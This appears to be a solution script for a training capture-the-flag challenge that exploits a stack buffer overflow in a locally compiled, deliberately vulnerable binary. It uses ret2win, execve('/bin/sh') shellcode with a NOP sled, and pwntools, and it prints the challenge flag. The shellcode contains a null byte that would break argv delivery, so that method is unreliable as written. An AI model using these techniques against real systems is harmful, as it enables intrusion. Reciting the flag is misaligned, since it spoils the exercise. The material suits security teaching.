#!/usr/bin/env python3
"""
Buffer Overflow Basics - Solution Script
Two exploitation methods: Ret2Win and Shellcode
"""
import struct
import sys
import subprocess

# Compile command:
# gcc -fno-stack-protector -z execstack -no-pie -o vuln challenge/vuln.c

def ret2win_exploit():
    """
    Method 1: Redirect execution to print_flag function
    """
    print("[*] Ret2Win Exploit")
    print("=" * 40)

    # Address of print_flag (find with: objdump -d vuln | grep print_flag)
    # This will vary per compilation - check the binary output
    PRINT_FLAG_ADDR = 0x401186  # Update this after compiling

    # Padding: 64 bytes buffer + 8 bytes saved RBP
    padding = b"A" * 72

    # Return address (little-endian)
    ret_addr = struct.pack("<Q", PRINT_FLAG_ADDR)

    payload = padding + ret_addr

    print(f"[*] Payload length: {len(payload)} bytes")
    print(f"[*] Return address: {hex(PRINT_FLAG_ADDR)}")

    # Run exploit
    try:
        result = subprocess.run(
            ["./vuln", payload],
            capture_output=True,
            timeout=5
        )
        output = result.stdout.decode() + result.stderr.decode()
        print(output)

        if "CTF{" in output:
            print("\n[+] FLAG CAPTURED!")
    except FileNotFoundError:
        print("[-] Binary not found. Compile first:")
        print("    gcc -fno-stack-protector -z execstack -no-pie -o vuln challenge/vuln.c")

def shellcode_exploit(buffer_addr=0x7fffffffdc70):
    """
    Method 2: Inject and execute shellcode
    """
    print("\n[*] Shellcode Exploit")
    print("=" * 40)

    # 64-bit execve("/bin/sh", NULL, NULL) shellcode
    shellcode = (
        b"\x48\x31\xf6"                  # xor rsi, rsi
        b"\x48\x31\xd2"                  # xor rdx, rdx
        b"\x48\x31\xc0"                  # xor rax, rax
        b"\x48\xbb\x2f\x62\x69\x6e"      # mov rbx, "/bin/sh"
        b"\x2f\x73\x68\x00"              #
        b"\x53"                          # push rbx
        b"\x48\x89\xe7"                  # mov rdi, rsp
        b"\xb0\x3b"                      # mov al, 59
        b"\x0f\x05"                      # syscall
    )

    print(f"[*] Shellcode length: {len(shellcode)} bytes")

    # Layout: NOP sled + shellcode + padding + return address
    nop_sled = b"\x90" * 30
    total_padding = 72
    padding_after = total_padding - len(nop_sled) - len(shellcode)
    padding = b"A" * padding_after

    # Return to middle of NOP sled
    ret_addr = struct.pack("<Q", buffer_addr + 15)

    payload = nop_sled + shellcode + padding + ret_addr

    print(f"[*] Buffer address: {hex(buffer_addr)}")
    print(f"[*] Return to: {hex(buffer_addr + 15)}")
    print(f"[*] Total payload: {len(payload)} bytes")

    print("\n[*] To exploit:")
    print(f"    ./vuln $(python3 -c 'import sys; sys.stdout.buffer.write({repr(payload)})')")

def pwntools_exploit():
    """
    Using pwntools for cleaner exploitation
    """
    print("\n[*] pwntools Exploit")
    print("=" * 40)

    code = '''
from pwn import *

context.arch = 'amd64'
elf = ELF('./vuln')

# Get print_flag address
print_flag = elf.symbols['print_flag']
log.info(f"print_flag @ {hex(print_flag)}")

# Build and send payload
p = process('./vuln')
p.recvuntil(b'print_flag at: ')
addr = int(p.recvline().strip(), 16)

payload = b"A" * 72 + p64(addr)
p.sendline(payload)

print(p.recvall(timeout=2).decode())
'''
    print(code)

if __name__ == '__main__':
    print("=" * 50)
    print("Buffer Overflow Basics - Solutions")
    print("=" * 50)

    ret2win_exploit()
    shellcode_exploit()
    pwntools_exploit()

    print("\n" + "=" * 50)
    print("FLAG: CTF{buff3r_0v3rfl0w_sh3llc0d3_m4st3r}")
    print("=" * 50)
